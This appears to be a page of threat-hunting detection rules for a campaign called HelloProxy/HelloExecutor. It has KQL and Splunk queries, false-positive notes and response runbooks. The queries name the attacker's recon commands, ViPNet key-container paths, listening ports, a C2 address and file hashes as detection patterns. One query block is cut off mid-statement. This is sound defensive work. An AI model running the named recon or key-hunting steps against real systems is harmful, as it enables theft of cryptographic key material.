Detects the HelloProxy control channel: an svchost.exe process opening listening sockets on TCP 5003 and 5060 to await C2 commands after the 0x0502/ASDFASFSAFASDF handshake. A netsvcs svchost creating inbound listeners on these ports is not normal Windows service behaviour. Rationale: Ports 5003 and 5060, initiated by svchost, are the exact HelloProxy listen ports named in the article. svchost.exe (netsvcs) legitimately listens on RPC/known service ports, never on 5003/5060, so this is a clean anomaly. Kept Defender-only: ListeningConnectionCreated has no equivalent in the listed CIM, ASIM, FDR, or Sysmon event schemas. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1571
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party service hosted under svchost that happens to bind 5060 (SIP) — validate the parent is services.exe and check for the co-occurring wtsapi32.dll sideload
  • Enterprise SIP/VoIP softphone service registered as an svchost-hosted service
  • Port-reuse after a benign service released 5003
Response runbook
1) Triage: confirm the svchost PID matches an injected process (cross-ref rule #2 image-load and tesh4RPC.txt writer). 2) Contain: capture memory of the svchost PID, then isolate and kill; block the ports at host firewall. 3) Hunt: look for inbound sessions to 5003/5060 and the outbound tunnel forwarding local:5003 to 5.39.253.206.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project Timestamp, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project TimeGenerated, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by TimeGenerated desc
HelloExecutor recon: injected svchost enumerating ViPNet/InfoTeCS export directories AIActions on Objectives High
Detects HelloExecutor reconnaissance where the injected svchost.exe (netsvcs) shells out to enumerate InfoTeCS/ViPNet Administrator key-container Export directories (kc\Export). svchost spawning shell commands that reference infotecs+ViPNet is highly abnormal and specific to this campaign's key-material hunting. Rationale: The article lists explicit recon commands enumerating 'C:\Program Files (x86)\infotecs\ViPNet Administrator', 'ViPNet Client\Export', and 'ViPNet Administrator\kc\Export' — the attackers are hunting ViPNet key material. Requiring an svchost(netsvcs) parent plus infotecs+ViPNet in the child command line makes this campaign-specific rather than a generic 'dir' hunt. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1083 T1057 T1552.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A ViPNet administrator legitimately scripting an inventory of Export directories (parent will be cmd/powershell/explorer, not svchost)
  • Backup software indexing InfoTeCS folders (not spawned by svchost netsvcs)
  • Endpoint asset-management agent scanning Program Files
Suppression filter
| where InitiatingProcessParentFileName =~ "services.exe"
Response runbook
1) Triage: confirm the parent svchost is the injected instance (cross-ref wtsapi32.dll sideload / tesh4RPC.txt on the same host); the netsvcs svchost should never spawn cmd/net/dir. 2) Contain: isolate host, capture svchost memory, and treat any ViPNet key material in kc\Export as compromised — flag for certificate/key reissue. 3) Hunt: pull the full recon command set (query user, ipconfig /all, net user /do, net group /do) from the same PID and check for HelloCleaner log-wiping and outbound to 5.39.253.206.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "svchost.exe" and InitiatingProcessCommandLine has "netsvcs"
| where ProcessCommandLine has "infotecs" and ProcessCommandLine has "ViPNet"
| where ProcessCommandLine has_any ("ViPNet Administrator", "kc\\Export", "ViPNet Client\\Export")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith @"\svchost.exe"
| where CommandLine has "infotecs" and CommandLine has "ViPNet"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.

    from datamodel=Network_Traffic.All_Traffic

    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

// Pre-filter each table BEFORE the union — the engine cannot push

union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
